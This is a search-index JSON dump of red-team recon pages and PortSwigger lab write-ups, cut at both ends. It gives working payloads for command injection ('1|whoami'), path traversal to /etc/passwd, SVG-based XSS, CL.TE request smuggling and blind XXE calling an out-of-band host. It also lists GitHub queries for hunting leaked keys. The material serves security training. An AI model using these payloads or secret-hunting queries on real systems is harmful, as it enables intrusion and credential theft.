SubBrute is a brute-forcing tool that guesses possible subdomains until it finds real ones. Amass uses a combination of DNS zone transfers, certificate parsing, search engines, and subdomain databases to find subdomains. You can build a tool that combines the results of multiple tools to achieve the best results. Service Enumeration  Next, enumerate the services hosted on the machines you’ve found. Since services often run on default ports, a good way to find them is by port-scanning the machine with either active or passive scanning. In active scanning, you directly engage with the server. Active scanning tools send requests to connect to the target machine’s ports to look for open ones. You can use tools like nmap or masscan for active scanning. In passive scanning, third-party resources are in use to learn about a machine’s ports without interacting with the server. Passive scanning is stealthier and helps attackers avoid detection. To find services on a machine without actively scanning it, you can use Shodan , Censys and Project Sonar . Combine the information gathered from different databases for the best results. Enumerate webserver directories  The next thing you can do to discover more of the site’s attack surface is brute-force the directories of the web servers you’ve found. Finding directories on servers is valuable, because through them, you might discover hidden admin panels, configuration files, password files, outdated functionalities, database copies, and source code files. Directory brute-forcing can sometimes allow you to directly take over a server. Even if you can’t find any immediate exploits, directory information often tells you about the structure and technology of an application. The nmap NSE script http-enum.nse offers a quite extensive fingerprint, especially when including Nikto database, but there are no guarantees all will be seen. And Nikto is very noisy. You can use Dirsearch or Gobuster for directory brute-forcing. These tools use wordlists to construct URLs, and then request these URLs from a web server. If the server responds with a status code in the 200 range, the directory or file exists. This means you can browse to the page and see what An example of running a Dirsearch command. The -u flag specifies the hostname, and the -e flag specifies the file extension to use when constructing URLs: ./dirsearch.py -u target_url -e php Gobuster’s dir mode can be used to find additional content on a specific domain or subdomain. This includes hidden directories and files. In this mode, you can use the -u flag to specify the domain or subdomain you want to brute-force and -w to specify the wordlist you want to use: gobuster dir -u target_url -w wordlist Manually visiting all the pages you’ve found through brute-forcing can be time-consuming. Instead, use a screenshot tool like EyeWitness or Snapper to automatically verify that a page is hosted on each location. EyeWitness accepts a list of URLs and takes screenshots of each page. In a photo gallery app, you can quickly skim these to find the interesting-looking ones. Keep an eye out for hidden services, such as developer or admin panels, directory listing pages, analytics pages, and pages that look outdated and ill-maintained. These are all common places for vulnerabilities to manifest. Spidering the site  Another way of discovering directories and paths is through web spidering, or web crawling, a process used to identify all pages on a site. A web spider tool starts with a page to visit. It then identifies all the URLs embedded on the page and visits them. By recursively visiting all URLs found on all pages of a site, the web spider can uncover many hidden endpoints in an application. OWASP Zed Attack Proxy (ZAP) has a built-in web spider, and Burp Suite has an equivalent tool called the crawler. Third-party hosting  Take a look at the company’s third-party hosting footprint. For example, look for the organisation’s S3 buckets. A way to find those is through Google dorking. site:s3.amazonaws.com COMPANY_NAME site:amazonaws.com COMPANY_NAME If the company uses custom URLs for its S3 buckets, try more flexible search terms instead. Companies often still place keywords like aws and s3 in their custom bucket URLs: amazonaws s3 COMPANY_NAME amazonaws bucket COMPANY_NAME amazonaws COMPANY_NAME s3 COMPANY_NAME Another way of finding buckets is to search a company’s public GitHub repositories for S3 URLs. Try searching these repositories for the term s3 . GrayhatWarfare is another online search engine you can use to find publicly exposed S3 buckets. And you can try to brute-force buckets by using keywords. Lazys3 is a useful tool for that. It relies on a wordlist to guess buckets that are permutations of common bucket names. Bucket Stream parses certificates belonging to an organisation and finds S3 buckets based on permutations of the domain names found on the certificates. Bucket Stream also automatically checks whether the bucket is accessible. Once you’ve found a couple of buckets that belong to the target organisation, use the AWS command line tool to see if you can access one. Install the tool with: pip...",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "96231753af2d5325a33d6b571575598f",
    "u": "https://recon.tymyrddin.dev/docs/physical/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Gather information to create an operations plan. In some cases, the client will provide much of the information, like vendors used, photographs of the locations, floorplans, front desk procedures, dress codes, photos of badges, security systems in place. If not, do recon. Why?  Identify vulnerabilities and weaknesses in physical security controls. How?  Passive reconnaissance Recon of facilities",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "5a05f62e88cc94afbe9f6b33a26b11d7",
    "u": "https://recon.tymyrddin.dev/docs/api/burp",
    "t": "Analyse traffic ",
    "c": "Analyse traffic  Pass web service application traffic through a proxy to gather more detail. Using a proxy helps dig into a website and look for vulnerabilities. FoxyProxy is a Firefox extension for switching an internet connection between proxy servers based on URL patterns. It simplifies configuring browsers to access proxy servers. Burp Suite is a popular penetration testing and vulnerability finder tool for checking web application security. To discover hidden flaws, route traffic through a proxy like Burp Suite. FoxyProxy can be used to turn it on and off.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "f4610429197f0979ce6050fa01a81bc3",
    "u": "https://recon.tymyrddin.dev/docs/api/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Locate the APIs and validate whether they are operational, find credential information (keys, secrets, usernames, passwords), version information, API documentation, and information about the API’s purpose. Why?  The more information gathered about a target, the better the odds of discovering and exploiting API-related vulnerabilities. How?  Collect data Understand application functionality Analyse traffic Document key parameters Check for exposed secrets",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "8ba3d3d5b3212810790cf7755baf5a35",
    "u": "https://recon.tymyrddin.dev/docs/app/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Recon strategies for gathering intel on a target. Why?  To discover all the possible ways of attacking a target before deciding on the most effective approach for web application hacking. How?  Manually walk through the target Scope discovery Other sneaky OSINT techniques Tech stack fingerprinting",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "3b4558c53e32c537879a01783be1762d",
    "u": "https://recon.tymyrddin.dev/docs/scanning/diving",
    "t": "Diving deeper in discovery ",
    "c": "Diving deeper in discovery  Identify live networks between source and already identified subnets Traceroute to the gateway or DNS server for each network Add newly identified networks to the list of subnets Discover the IP addresses of servers behind a DNS Discover how long a server has been up Where is a server’s physical location … Under the hood  Traceroutes work by manipulating the Time-To-Live (TTL) field in an IP packet. This field tells a device a packet is passing through how many more systems (or hops) a packet can pass through before being dropped. This is to ensure that lost packets do not just simply hop around the Internet forever and eventually, with enough lost packets clogs it up. The field is decremented as it passes through each network hop. When it reaches zero, a router will drop the packet being sent through it and send an ICMP Time-To-Live exceeded message back to the source. This can be used to determine the route to a host or network, the time it takes for a message to be sent and a response to be received by using a traceroute, which service provider the target is using There is an ICMP traceroute (tracert.exe, Windows) and a UDP traceroute (traceroute -l, all other OSs). ICMP traceroute expects all intermediary routers to respond with an ICMP TTL Exceeded message. Most do not (RFC 792) UDP traceroute is not so great where filtering is in place. Most Unix traceroute implementations now support TCP static port traceroutes out of the box. Mapping out DMZ and internal networks  Because all traceroutes work using ICMP TTL Exceeded messages, which protocol is used is not important as long as there is a known response. Use a TCP traceroute with a SYN flag set, and commonly open ports such as 25, 80 or 443 for which you can get a reliable response back once the target is reached. Uptime  Each time a server is patched or updated, it must also be rebooted. If a server has been up for a long time, we know it has not been patched or updated in that time, and that it will be vulnerable to all vulnerabilities discovered during that timeframe. Examples  Traceroute in nmap with Geo resolving: nmap --traceroute --script traceroute-geolocation.nse -p 80 [ip_or_hostname] The default packet which hping3 will create is a TCP packet: # hping3 -T -V --tr-stop -S -p 80 [ip_or_hostname] Specify the source and destination ports of the packet to help it bypass the firewall. Send three packets out ( -c ) to destination port 53 ( -p ) and set the SYN flag in the packet, so it looks like the first phase of the three-way handshake ( -S ): hping3 -c 3 -p 53 -S [ip_or_hostname] Traceroute in hping3 using a TCP scan to a specific destination port: # hping3 --traceroute --verbose --syn --destport [80] [ip_or_hostname] Discover the IP addresses of servers behind a DNS: # hping3 [big site hostname] -S -p 80 -T –ttl 13 –tr-keep-ttl -n Uptime of a server: # hping3 [ip_or_hostname] -p 80 –tcp-timestamp -S -c 4",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "77bef2e609a2bbb9d38d4b3ba1cf60fb",
    "u": "https://recon.tymyrddin.dev/docs/app/sneaky",
    "t": "Other sneaky OSINT techniques ",
    "c": "Other sneaky OSINT techniques  Engineering job listings often reveal the technologies the company uses. If you can’t find relevant job posts, search for employees’ profiles on LinkedIn, and read employees’ personal blogs or their engineering questions on forums like Stack Overflow and Quora. People’s work calendars often contain meeting notes, slides, and sometimes even login credentials. If an employee shares their calendars with the public by accident, you could gain access to these. The organisation or its employees’ social media pages might also leak valuable information. Like a sets of valid credentials on Post-it Notes visible in the background of office selfies??? If the company has an engineering mailing list, sign up for it to gain insight into the company’s technology and development process. Check for SlideShare or Pastebin accounts. Consult archive websites like the Wayback Machine . Tomnomnom’s tool Waybackurls can automatically extract endpoints and URLs from the Wayback Machine.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "563d3df639de5cc87ce98241d343a8a5",
    "u": "https://recon.tymyrddin.dev/docs/footprinting/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Gathering information about a target system that can be used to execute a successful attack. To get this information, use various methods with variant tools. Why?  Analyse the security posture of the target and find loopholes for creating an attack plan. Using different tools and techniques, narrow down the range of IP addresses. Use the collected information to identify weaknesses in the target’s security. Graphically represent the target’s network, so it can be used as a guide during the attack. How?  Gather network information Gather system information Collect organisation information",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "07424d82724b1a48d202f4f49f538fd1",
    "u": "https://recon.tymyrddin.dev/docs/api/functionality",
    "t": "Understand application functionality ",
    "c": "Understand application functionality  Enumerate the endpoints and identify the parameters that can be used to call the API. Use a tool like Postman to send requests to the API and see the response. Review the API documentation. This will help understand the functionality of the API and identify the attack surface. Resources  Using SOAP requests",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "17d2dcae1d0a060e2a5976096aaad82d",
    "u": "https://recon.tymyrddin.dev/docs/footprinting/organisation",
    "t": "Collect organisation information ",
    "c": "Collect organisation information  Employee information Organisation’s background Phone numbers Locations Advanced searches  Search engines can be used to gather information about the target organisation. Search results can include , and other information that could be useful. Search engines crawl the world wide web day and night to index new web pages and files. Sometimes this can lead to indexing confidential information: Information about employees Intranet information Login pages Documents for internal company use Confidential spreadsheets with usernames, email addresses, and even passwords Files containing usernames Sensitive directories Service version number (some of which might be vulnerable and unpatched) Error messages Google dorking  Google dorking is a technique which involves using a set of search operators and building complex queries. The operators that are used in Google hacking are called dorks. Email footprinting  Email footprinting involves collecting information from emails by monitoring the email delivery and inspecting the headers: IP address of the recipient Geolocation of the recipient Delivery information Visited links Browser and OS information Reading time Email headers contain information about the sender, subject, and recipient. All this information is valuable to hackers when planning to attack their target. Information contained in email headers include: Sender’s name IP/Email address of the sender Mail server Mail server authentication system Send and delivery stamp Unique number of the message Email tracking tools have the capability of tracking emails and inspecting their headers to extract useful information. The sender is notified of the email being delivered and opened by the recipient. Assets discovery  Assets discovery involves collecting all the company names owned by a main company and then all the assets of these companies: Find the acquisitions of the main company, this will give the companies inside the scope. Find the ASN (if any) of each company, this will give the IP ranges owned by each company. Use reverse whois lookups to search for other entries (organisation names, domains…) related to the first one (recursively). Shodan and SSL filters can be used to search for other assets (the SSL trick can be done recursively). Investigating social media  The private world of yesterday is now an online world. Everyone with a search engine has open access to social networks, government databases, and public records. Social media websites have become very popular for not only personal use but also for corporate use. Some social media platforms can reveal tons of information about the target. This is especially true as many users tend to overshare details about themselves and their work. To name but a few, it’s worthwhile checking the following: LinkedIn Twitter Facebook Instagram Google groups Social media scraping can automate discovering names, email addresses, phone numbers, biographies. Visit job listing sites  Job advertisements can also tell a lot about an organisation. In addition to revealing names and email addresses, job posts for technical positions could give insight into the target’s systems and infrastructure. The popular job posts might vary from one country to another. Make sure to check job listing sites in the countries where the target would post their ads. And it is always worth checking their website for any job opening and seeing if this can leak any interesting information.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "106e87e4f24df095e7d4f2ad32baaf0a",
    "u": "https://recon.tymyrddin.dev/docs/scanning/defence",
    "t": "Defence detection ",
    "c": "Defence detection  Check to see if a target is using a load balancing solution with the lbd (load balancing detector) command. To determine if the target is behind a web application firewall (WAF), use the wafw00f command. It may be needed to encode some attack tools to try to trick antivirus software into not seeing the code as being harmful. To detect what ports a firewall is forwarding on to a target, use the firewalk command. Is also available for nmap as firewalk.nse script.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "aba9d1f5df203926b310557f55850f83",
    "u": "https://recon.tymyrddin.dev/docs/scanning/war-dialing-driving-flying-shipping",
    "t": "War-dialing-driving-flying-shipping ",
    "c": "War-dialing-driving-flying-shipping  Discover wireless networks. War dialing  Large organisations usually have their phone numbers assigned in blocks from a local telephone company, and many have their own dialing prefix. This information was used in war dialing all the company phone numbers looking for a dial-up server. Once such a server was found, it was used for guessing account usernames. War driving  War-driving, sitting in a parking lot or in a building across the street with a laptop and a wireless NIC, looking for unsecured or poorly secured access points. War-driving has been made easy by programs such as Network Stumbler and Wellenreiter, which use consumer WiFi cards to automatically scan the airwaves for networks. These wardriving programs and databases are often correlated with global positioning system (GPS) data so that physical maps of these networks can be made. War strolling  War-strolling, simply walking around with wireless equipment looking for networks. War flying  War-flying, mounting antennas on a drone and flying it around as a variation on war-driving. War shipping  War-shipping, shipping someone a device that does wireless scans. It uses disposable, low-cost and low-power 3G-enabled single-board computers that are easy to build for under 100 euro, the proliferation of e-commerce deliveries and a command-and-control (C&C) server to remotely perform close-proximity attacks, regardless of the location of an adversary. It increases target accuracy dramatically. Hide a tiny device in a package and ship it off to the target to gain access to their network. Low build-cost means several can be shipped. The device can be tucked into the bottom of a packaging box or stuffed in a toy. While in transit, the device can do periodic basic wireless scans, similar to what a laptop does in war-driving when looking for Wi-Fi hotspots, and send its location coordinates via GPS back to the C&C server. Once having arrived it can be used for further attacks to gain a persistent foothold in the network. These attacks have their limitations. These include the amount of time it takes to perform the attack and the suspicions that arise when a car is detected circling a block hundreds of times with an auspicious antenna up top and a laptop in view, a drone circling around, and someone that seemingly aimlessly keeps wandering about. Resources  Stumbler is a tool for Windows that facilitates detection of Wireless LANs using the 802.11b, 802.11a and 802.11g WLAN standards. It runs on Microsoft Windows operating systems from Windows 2000 to Windows XP. A trimmed-down version called MiniStumbler is available for the handheld Windows CE operating system. The program is commonly used for wardriving, verifying network configurations, finding locations with poor coverage in a WLAN, detecting causes of wireless interference, detecting unauthorized (“rogue”) access points and aiming directional antennas for long-haul WLAN links. Wellenreiter is a wireless network discovery and auditing tool that supports Prism2, Lucent, and Cisco based cards. It is an easy to use Linux scanning tool. No card configuration has to be done and it is quite self-explanatory. It can discover networks (BSS/IBSS), and detects ESSID broadcasting or non-broadcasting networks and their WEP capabilities and the manufacturer automatically. DHCP and ARP traffic are decoded and displayed to give further information about the networks. An ethereal/tcpdump-compatible dumpfile and an Application savefile will be automatically created. Using a supported GPS device and the gpsd the location of the discovered networks can be tracked.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "c207b124e1029a5ec3c5e3be2aa1f2e0",
    "u": "https://recon.tymyrddin.dev/docs/footprinting/system",
    "t": "Gather system information ",
    "c": "Gather system information  Web server operating systems Server locations Users Passwords Website footprinting  Website footprinting is a technique in which information about the target is collected by monitoring the target’s website. Hackers can map the entire website of the target without being noticed. Website footprinting gives information about: Software Operating system Subdirectories  information Scripting platform Query details By examining the website headers, it is possible to obtain information about the following headers: Content-Type Accept-Ranges Connection Status Last-Modified Information X-powered-by Information Web Server Information Additional ways to gather information is through HTML Source Code and cookie examination. By examining the HTML source code, it is possible to extract information from the comments in the code, as well as gain insight into the file system structure by observing the links and image tags. Cookies can also reveal important information about the software that is running on the server and its behaviour. And by inspecting sessions, it is possible to identify the scripting platforms. Web spiders methodically browse a website in search of specific information. Information collected can be helpful in planning social engineering attacks. Cloning websites  Website mirroring or website cloning refers to the process of duplicating a website. Mirroring a website helps in browsing the site offline, searching the website for vulnerabilities, and discovering useful information. Websites may store documents of different format, which in turn may contain hidden information and metadata that can be analyzed and used in (planning) an attack. This metadata can be extracted with metadata extraction tools. Eyeing repositories  Look for hardcoded secrets: SQL passwords AWS access keys Google Cloud private keys API tokens Test accounts In GitHub search: # Sample of GitHub queries org:TargetName password org:TargetName aws_secret_access_key org:TargetName aws_key org:TargetName BEGIN RSA PRIVATE KEY org:TargetName BEGIN OPENSSH PRIVATE KEY org:TargetName secret_key org:TargetName hooks.slack.com/services org:TargetName sshpass -p org:TargetName sq0csp org:TargetName apps.googleusercontent.com org:TargetName extension:pem key Sensitive files discovery  Many tools for finding the URLs of sensitive files exist. One such tool is dirb , a web content discovery tool.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "167124ae5bf3c44da18ff419f98dfcf3",
    "u": "https://enum.tymyrddin.dev/docs/system/virtual",
    "t": "Scanning virtualised systems ",
    "c": "Scanning virtualised systems  Some systems may be running on virtual machines or containers. Depending on the configuration of the virtualisation environment, it may not be possible to communicate with some virtual machines and containers if they are not connected to the network or are configured to network with one another, but not the real network. In this scenario, set up a virtual machine to connect to the private virtual machine network to do a vulnerability scan or look for vulnerability scanners that can have an agent installed in the virtual machines to be scanned.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "e8b808f9d750cbb9239bf279386fb2dc",
    "u": "https://enum.tymyrddin.dev/docs/system/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  System enumeration is a process of connecting to and interrogating a network or system to retrieve information about that network or system. Take information already gathered during reconnaissance (like IP addresses) and during scanning (open ports) and gather as much data about the targets and services running on the targets, using a variety of techniques and tools. Why?  To discover potential attack vectors in the system, and further exploitation of the system. Items of great interest: Network services that are running but not in use. Default user accounts that have no passwords. User accounts that have a revealed password. Guest accounts that are active. Security tokens. How?  NetBios enumeration SNMP enumeration LDAP enumeration NTP enumeration SMTP enumeration DNS enumeration macOS enumeration Linux enumeration Windows enumeration Scanning virtualised systems Scanning cloud infrastructure",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "19ff11c89beaaf23d9b02557d8b5985e",
    "u": "https://webapp.tymyrddin.dev/docs/os/1",
    "t": "OS command injection, simple case ",
    "c": "OS command injection, simple case  Description  This lab contains an OS command injection vulnerability in the product stock checker: The application executes a shell command containing user-supplied product and store IDs, and returns the raw output from the command in its response. Reproduction and proof of concept  Use Burp Suite to intercept and modify a request that checks the stock level. Modify the storeID parameter, giving it the value 1|whoami . productId=1&storeId=1|whoami Observe that the response contains the name of the current user. HTTP/1.1 200 OK Content-Type: text/plain; charset=utf-8 Connection: close Content-Length: 13 peter-gmkX5d Exploitability  An attacker will need to execute the whoami command to determine the name of the current user.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "5c61916057b5f71bf8eb83a990ac5bf2",
    "u": "https://webapp.tymyrddin.dev/docs/traversal/5",
    "t": "File path traversal, validation of start of path ",
    "c": "File path traversal, validation of start of path  Description  This lab contains a file path traversal vulnerability in the display of product images. The application transmits the full file path via a request parameter, and validates that the supplied path starts with the expected folder. Reproduction and proof of concept  Use Burp Suite to intercept and modify a request that fetches a product image. Modify the filename parameter, giving it the value: /var/www/images/../../../etc/passwd The response contains the contents of the /etc/passwd file. Exploitability  An attacker will need to retrieve the contents of the /etc/passwd file.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "2771ab8ec3e0b69960cde28c4fdb592d",
    "u": "https://webapp.tymyrddin.dev/docs/xss/19",
    "t": "Reflected XSS with some SVG markup allowed ",
    "c": "Reflected XSS with some SVG markup allowed  Description  The website in this lab has a simple reflected XSS vulnerability. The site is blocking common tags but misses some SVG tags and events. Reproduction and proof of concept  Inject a standard XSS payload in the search box: <img src=1 onerror=alert(1)> Note this payload gets blocked. Use Burp Intruder to test which tags and attributes are being blocked. Open Burp’s browser and use the search function in the lab. Send the resulting request to Burp Intruder. In Burp Intruder, in the Positions tab, click “Clear §”. In the request template, replace the value of the search term with: <> Place the cursor between the angle brackets and click “Add §” twice to create a payload position. The value of the search term should now be: <§§> Visit the XSS cheat sheet and click “Copy tags to clipboard”. In Burp Intruder, in the Payloads tab, click “Paste” to paste the list of tags into the payloads list. Click “Start attack”. When the attack is finished, review the results. All payloads caused an HTTP 400 response, except for the ones using the svg , animatetransform , title , and image tags, which received a 200 response. Go back to the Positions tab in Burp Intruder and replace the search term with: <svg><animatetransform%20=1> Place the cursor before the = character and click “Add §” twice to create a payload position. The value of the search term should now be: <svg><animatetransform%20§§=1> Visit the XSS cheat sheet and click “Copy events to clipboard”. In Burp Intruder, in the Payloads tab, click “Clear” to remove the previous payloads. Then click “Paste” to paste the list of attributes into the payloads list. Click “Start attack”. When the attack is finished, review the results. Note that all payloads caused an HTTP 400 response, except for the onbegin payload, which caused a 200 response. Post the following URL in the browser to confirm that the alert() function is called and the lab is solved: https://0ad000a004968e0fc04c4fee006d000c.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "c61f6dea7609d85382450b1ff9214199",
    "u": "https://webapp.tymyrddin.dev/docs/smuggling/6",
    "t": "Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability ",
    "c": "Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability  Description  This lab involves a front-end and back-end server, and the front-end server doesn’t support chunked encoding. There’s an admin panel at /admin , but the front-end server blocks access to it. Reproduction and proof of concept  Try to visit /admin and observe that the request is blocked. Using Burp Repeater, issue the following request twice: POST / HTTP/1.1 Host: lab-id.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 37 Transfer-Encoding: chunked 0 GET /admin HTTP/1.1 X-Ignore: X Observe that the merged request to /admin was rejected due to not using the header Host: localhost . Issue the following request twice: POST / HTTP/1.1 Host: lab-id.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 54 Transfer-Encoding: chunked 0 GET /admin HTTP/1.1 Host: localhost X-Ignore: X Observe that the request was blocked due to the second request’s Host header conflicting with the smuggled Host header in the first request. Issue the following request twice so the second request’s headers are appended to the smuggled request body instead: POST / HTTP/1.1 Host: lab-id.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 116 Transfer-Encoding: chunked 0 GET /admin HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded Content-Length: 10 x= Observe that you can now access the admin panel. Using the previous response as a reference, change the smuggled request URL to delete the user carlos : POST / HTTP/1.1 Host: lab-id.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 139 Transfer-Encoding: chunked 0 GET /admin/delete?username=carlos HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded Content-Length: 10 x= Exploitability  An attacker will need to smuggle a request to the back-end server that accesses the admin panel and deletes the user carlos .",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "3c566c0d0adf8670ea7d65ec0abb228f",
    "u": "https://webapp.tymyrddin.dev/docs/xxe/4",
    "t": "Blind XXE with out-of-band interaction via XML parameter entities ",
    "c": "Blind XXE with out-of-band interaction via XML parameter entities  Description  This lab has a “Check stock” feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities. Reproduction and proof of concept  Visit a product page, click “Check stock” and intercept the resulting POST request in Burp Suite Professional. Go to the Burp menu, and launch the Burp Collaborator client. Click “Copy to clipboard” to copy a unique Burp Collaborator payload to your clipboard. Leave the Burp Collaborator client window open. Insert the following external entity definition in between the XML declaration and the stockCheck element, but insert your Burp Collaborator subdomain where indicated: <!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM \"http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net\"> %xxe; ]> Go back to the Burp Collaborator client window, and click “Poll now”. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload. If you don’t see any interactions listed, wait a few seconds and try again. Exploitability  An attacker needs to use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator. Note: To prevent the Academy platform being used to attack third parties, the firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator’s default public server.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "6346d87dbe6d878bd41906d6468fdf12",
    "u": "https://webapp.tymyrddin.dev/docs/deserialisation/2",
    "t": "Modifying serialised data types ",
    "c": "Modifying serialised data types  Description  This lab uses a serialisation-based session mechanism and is vulnerable to authentication bypass as a result. Reproduction  Log in using with wiener:peter . In Burp, open the post-login GET /my-account request and examine the session cookie using the Inspector to reveal a serialized PHP object. Send this request to Burp Repeater. In Burp Repeater, use the Inspector panel to modify the session cookie as follows: Update the length of the username attribute to 13 . Change the username to administrator . Change the access token to the integer 0 . As this is no longer a string, you also need to remove the double-quotes surrounding the value. Update the data type label for the access token by replacing s with i . The result should look like this: O:4:\"User\":2:{s:8:\"username\";s:13:\"administrator\";s:12:\"access_token\";i:0;} Click “Apply changes”. The modified object will automatically be re-encoded and updated in the request. Send the request. Notice that the response now contains a link to the admin panel at /admin , indicating that you have successfully accessed the page as the administrator user. Change the path of your request to /admin and resend it. Notice that the /admin page contains links to delete specific user accounts. Change the path of your request to /admin/delete?username=carlos and send the request to solve the lab. PoC  Exploitability  An attacker will need to log in; edit the serialized object in the session cookie to access the administrator account; and delete Carlos’ account.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "1b4f094601384e38f24c0c65cca5e4b5",
    "u": "https://webapp.tymyrddin.dev/docs/ssrf/readme",
    "t": "Introduction ",
    "c": "Portswigger Academy Server-side request forgery Labs Introduction  What?  Server-side request forgery (also known as SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make requests to an unintended location. Why?  In a typical SSRF attack, the attacker might cause the server to make a connection to internal-only services within the organization’s infrastructure. In other cases, they may be able to force the server to connect to arbitrary external systems, potentially leaking sensitive data such as authorization credentials. How?  Server-side request forgery (SSRF) techniques Basic SSRF against the local server Basic SSRF against another back-end system SSRF with blacklist-based input filter SSRF with filter bypass via open redirection vulnerability Blind SSRF with out-of-band detection SSRF with whitelist-based input filter Blind SSRF with Shellshock exploitation",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "88e8cfca255203c53d317476fe292482",
    "u": "https://webapp.tymyrddin.dev/docs/acl/1",
    "t": "Unprotected admin functionality ",
    "c": "Unprotected admin functionality  Description  This lab has an unprotected admin panel. Reproduction and proof of concept  Go to the lab and view robots.txt by appending /robots.txt to the lab URL. Notice that the Disallow line discloses the path to the admin panel. In the URL bar, replace /robots.txt with /administrator-panel to load the admin panel. Delete carlos . Exploitability  An attacker will need to delete the user carlos .",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "c6fbea40ed165d58fa5df4401c23c1f2",
    "u": "https://webapp.tymyrddin.dev/docs/smuggling/15",
    "t": "CL.0 request smuggling ",
    "c": "CL.0 request smuggling  Description  This lab is vulnerable to CL.0 request smuggling attacks. The back-end server ignores the Content-Length header on requests to some endpoints. Reproduction and proof of concept  Probe for vulnerable endpoints  From the Proxy -> HTTP history , send the GET / request to Burp Repeater twice. In Burp Repeater, add both of these tabs to a new group. Go to the first request and convert it to a POST request (right-click and select Change request method). In the body, add an arbitrary request smuggling prefix. The result should look something like this: Change the path of the main POST request to point to an arbitrary endpoint that you want to test. Using the drop-down menu next to the Send button, change the send mode to Send group in sequence (single connection). Change the Connection header of the first request to keep-alive. Send the sequence and check the responses. If the server responds to the second request as normal, this endpoint is not vulnerable. If the response to the second request matches what you expected from the smuggled prefix (in this case, a 404 response), this indicates that the back-end server is ignoring the Content-Length of requests. Deduce that you can use requests for static files under /resources , such as /resources/images/blog.svg , to cause a CL.0 desync. Exploit  In Burp Repeater, change the path of your smuggled prefix to point to /admin. Send the requests in sequence again and observe that the second request has successfully accessed the admin panel. Smuggle a request to GET /admin/delete?username=carlos request to solve the lab. Exploitability  An attacker will need to identify a vulnerable endpoint, smuggle a request to the back-end to access to the admin panel at /admin , then delete the user carlos.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "471347023271b7349c8c99eef5fc241d",
    "u": "https://webapp.tymyrddin.dev/docs/id/5",
    "t": "Information disclosure in version control history ",
    "c": "Information disclosure in version control history  Description  This lab discloses sensitive information via its version control history. Reproduction and proof of concept  Open the lab and browse to /.git to reveal the lab’s Git version control data. Download a copy of this entire directory. For non-Windows users, the easiest way to do this is using the command wget -r https://your-lab-id.web-security-academy.net/.git . Windows users will need to find an alternative method, or install a UNIX-like environment, such as Cygwin, in order to use this command. Explore the downloaded directory using your local Git installation. Notice that there is a commit with the message Remove admin password from config . Look closer at the diff for the changed admin.conf file. Notice that the commit replaced the hard-coded admin password with an environment variable ADMIN_PASSWORD instead. The hard-coded password is still clearly visible in the diff. Go back to the lab and log in to the administrator account using the leaked password. To solve the lab, open the admin interface and delete Carlos’s account. Exploitability  An attacker will need to obtain the password for the administrator user from git ; then log in and delete Carlos’s account.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "7e160b4cfe7f304890c450f15bc452d3",
    "u": "https://webapp.tymyrddin.dev/docs/auth/4",
    "t": "Username enumeration via subtly different responses ",
    "c": "Username enumeration via subtly different responses  Description  This lab is subtly vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password . Reproduction and proof of concept  With Burp running, submit an invalid username and password. Send the POST /login request to Burp Intruder and add a payload position to the username parameter. On the Payloads tab, make sure that the Simple list payload type is selected and add the list of candidate usernames. On the Options tab, under Grep - Extract , click Add. In the dialog that appears, scroll down through the response until you find the error message Invalid username or password.. Use the mouse to highlight the text content of the message. The other settings will be automatically adjusted. Click OK and then start the attack. When the attack is finished, notice that there is an additional column containing the error message you extracted. Sort the results using this column to notice that one of them is subtly different. Look closer at this response and notice that it contains a typo in the error message - instead of a full stop/period, there is a trailing space. Make a note of this username. Close the attack and go back to the Positions tab. Insert the username you just identified and add a payload position to the password parameter: username=identified-user&password=§invalid-password§ On the Payloads tab, clear the list of usernames and replace it with the list of passwords. Start the attack. When the attack is finished, notice that one of the requests received a 302 response. Make a note of this password. Log in using the username and password that you identified and access the user account page to solve the lab. Exploitability  An attacker will need to enumerate a valid username, brute-force this user’s password, then access their account page.",
    "cat": "red_in",
